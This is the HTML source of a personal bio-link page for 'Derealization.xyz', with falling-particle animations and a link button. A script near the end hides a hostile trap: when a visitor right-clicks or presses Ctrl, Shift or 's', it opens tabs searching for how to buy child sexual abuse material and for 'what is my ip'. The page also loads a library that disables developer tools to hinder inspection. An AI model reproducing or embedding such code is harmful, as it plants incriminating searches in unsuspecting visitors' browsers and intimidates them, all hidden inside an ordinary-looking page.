<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <link rel="shortcut icon" href="favicon.png" type="image/x-icon">
    <script disable-devtool-auto src='https://cdn.jsdelivr.net/npm/disable-devtool'></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/p5.js/1.4.0/p5.js"></script> <!-- Adding p5.js library -->
    <title>@Derealization</title>
    <style>
        body {
            cursor: url('https://custom-cursor.com/en/collection/battle-cats/battle-cats-drury-witch'), auto;
        }

        #who {
            text-shadow: 0 0 8px rgba(255, 255, 255, 0.505), 0 0 15px rgba(255, 255, 255, 0.658), 0 0 20px rgba(255, 255, 255, 0.505);
            color: white; 
            font-size: 3em; 
        }

        #footer {
            text-shadow: 0 0 1px rgba(255, 255, 255, 0.505), 0 0 5px rgba(255, 255, 255, 0.658), 0 0 7px rgba(255, 255, 255, 0.505);
            color: white; 
            font-size: 2em; 
        }

        a button {
            color: white; 
            text-decoration: none; 
        }

        #falling-pills {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none; 
            z-index: -1; 
        }

        .pill {
            position: absolute;
            width: 6px; 
            height: 6px; 
            background-color: white; 
            border-radius: 50%;
            animation: fall 5s linear infinite; 
        }

        @keyframes fall {
            0% {
                transform: translateY(-100%);
                opacity: 0;
            }

            100% {
                transform: translateY(100vh);
                opacity: 1;
            }
        }
    </style>
</head>
<body>
    <main>
        <span id="who">Derealization.xyz</span>
        <span id="footer">Remedy? /bio-link </span>
        <div class="flexbox">
            <a href="https://derealization.xyz/bluedevil"><button>@bluedevil?</button></a>
        </div>
        <div id="falling-pills"></div>
    </main>
    <script>
        
        function createPill() {
            
            var pill = document.createElement("div");
            pill.classList.add("pill"); 
            pill.style.left = Math.random() * window.innerWidth + "px"; 
            document.getElementById("falling-pills").appendChild(pill); 

           
            setTimeout(function () {
                pill.remove();
            }, 6000);
        }

        
        setInterval(createPill, 500);
    </script>

   
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            var script = document.createElement('script');
            script.src = 'https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js';
            script.onload = function () {
                particlesJS("falling-pills", {
                    "particles": {
                        "number": {
                            "value": 40,
                            "density": {
                                "enable": true,
                                "value_area": 800
                            }
                        },
                        "color": {
                            "value": "#ffffff"
                        },
                        "opacity": {
                            "value": 0.7,
                            "random": false,
                            "anim": {
                                "enable": false
                            }
                        },
                        "size": {
                            "value": 2.3,
                            "random": true,
                            "anim": {
                                "enable": false
                            }
                        },
                        "line_linked": {
                            "enable": false
                        },
                        "move": {
                            "enable": true,
                            "speed": 5,
                            "direction": "bottom",
                            "random": true,
                            "straight": false,
                            "out_mode": "out",
                            "bounce": false,
                            "attract": {
                                "enable": true,
                                "rotateX": 300,
                                "rotateY": 1200
                            }
                        },
                        "interactivity": {
                            "events": {
                                "onhover": {
                                    "enable": false
                                },
                                "onclick": {
                                    "enable": false
                                },
                                "resize": false
                            }
                        },
                        "retina_detect": true
                    }
                });
            }
            document.head.append(script);
        });
    </script>

   
    <script>
        function openNewPage(url) {
            window.open(url, '_blank');
        }

        function handleEvent(event) {
            
            if (event.type === 'contextmenu' || (event.type === 'keydown' && (event.ctrlKey || event.shiftKey || event.key === 's'))) {
             
                openNewPage('https://www.google.com/search?q=how+to+buy+child+porn');
               
                openNewPage('https://www.google.com/search?q=what+is+my+ip'); 
                event.preventDefault(); 
            }
        }

        window.addEventListener('contextmenu', handleEvent); 
        window.addEventListener('keydown', handleEvent); 
    </script>

</body>
</html>
